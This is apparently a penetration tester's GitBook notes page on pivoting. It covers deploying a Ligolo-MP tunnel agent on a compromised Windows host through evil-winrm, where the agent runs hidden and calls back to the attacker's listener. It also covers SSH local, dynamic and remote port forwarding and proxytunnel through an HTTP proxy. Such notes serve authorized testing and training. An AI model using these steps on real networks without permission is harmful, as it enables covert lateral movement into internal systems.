---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/lateral-movement/pivoting/linux
---

# Linux

### Ligolo-MP

Started a Ligolo-MP server listener on port 11601.

{% code overflow="wrap" %}
```bash
sudo ligolo-mp server -laddr 0.0.0.0:11601
```
{% endcode %}

Push Enter/Connect

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
Push CTRL+N to create new Agent (use TAB for switch to new Linie)
Use you tun0 IP
Activate Ignore env proxy
OS= Windwos ARCH=amd64
Then Submit
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

The tool create agent.bin File

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Move to exe

{% code overflow="wrap" %}
```
mv agent.bin agent.exe
```
{% endcode %}

We Upload agent.exe (in our evil-winrm session)

We start agent.exe (in background)

{% code overflow="wrap" %}
```bash
Start-Process .\agent.exe -WindowStyle Hidden
```
{% endcode %}

Then we see in ligolo that we got a Session

<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Push Enter Add route**

<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

We add the Route 192.168.2.0/24

<figure><img src="../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>



### Local Port Forwarding

<pre class="language-bash"><code class="lang-bash"><strong>kali$ ssh -L 8000:10.10.10.10:80 user@10.10.0.5 -fN
</strong></code></pre>

* -f backgrounds the shell immediately so that we have our own terminal back.
* -N tells SSH that it doesn't need to execute any commands
* -L which creates a link to a Local port

### Dynamic Port Forwarding

```basic
ssh -D 9050 user@10.10.0.10 -fN
```

* -D which creates a dynamic proxy

### Remote Port Forwarding

```bash
$ ssh -N -R 10.10.10.10:5901:127.0.0.1:5901 -i id_rsa pwned@10.10.10.11


┌──(pwned㉿kali)-[~/transfer/Lin-Tools]
└─$ netstat -tplun
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      5882/python2        
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:5901                :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:54280           0.0.0.0:*                           -                   
                                                                                                                                                                                              
┌──(pwned㉿kali)-[~/transfer/Lin-Tools]
└─$ nmap -p5901 127.0.0.1 -sC -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-21 19:03 +07
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00048s latency).

PORT     STATE SERVICE VERSION
5901/tcp open  vnc     VNC (protocol 3.3; Locked out)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
```

### ProxyTunnel

When the server does not open port 22. But the application is using http proxy service, we can use tool proxytunnel to forward traffic to the remote server.

```bash
proxytunnel -p $ip:3128 -d 127.0.0.1:22 -a 4444

ssh john@127.0.0.1 -p 4444
```

<figure><img src="../../../../.gitbook/assets/image (685).png" alt=""><figcaption></figcaption></figure>
